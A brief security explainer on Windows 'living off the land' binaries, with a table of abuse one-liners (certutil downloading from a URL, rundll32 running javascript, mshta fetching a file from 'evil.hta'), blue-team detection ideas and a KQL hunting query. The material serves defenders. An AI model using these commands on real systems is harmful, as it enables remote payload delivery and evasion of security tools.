# üõ†Ô∏è Living off the Land Binaries (LOLBins)

## üß† What is it?

LOLBins are **legitimate, trusted Windows binaries** that attackers use for malicious purposes ‚Äî like downloading payloads, executing code, or evading detection.

Because these tools are signed by Microsoft, they‚Äôre **often whitelisted** by AV/EDR.

> It‚Äôs like breaking into a bank using a police uniform. You're trusted ‚Äî so no one questions you.

## ‚úÖ Common LOLBins

| Tool         | Abuse Example                                           |
|--------------|---------------------------------------------------------|
| `certutil`   | Download files: `certutil -urlcache -split -f http://...` |
| `rundll32`   | Execute script: `rundll32.exe javascript:"..."`          |
| `mshta`      | Run malicious HTA files: `mshta http://evil.hta`         |

## üõ°Ô∏è Detection Ideas (Blue Team)

- Monitor command-line use of these tools with network activity
- Detect use of flags like `/i`, `-f`, or script content
- Look for system binaries spawning non-standard processes

## üîç KQL Detection

```kql
DeviceProcessEvents
| where FileName in~ ("certutil.exe", "rundll32.exe", "mshta.exe", "regsvr32.exe")
| where ProcessCommandLine contains "http"
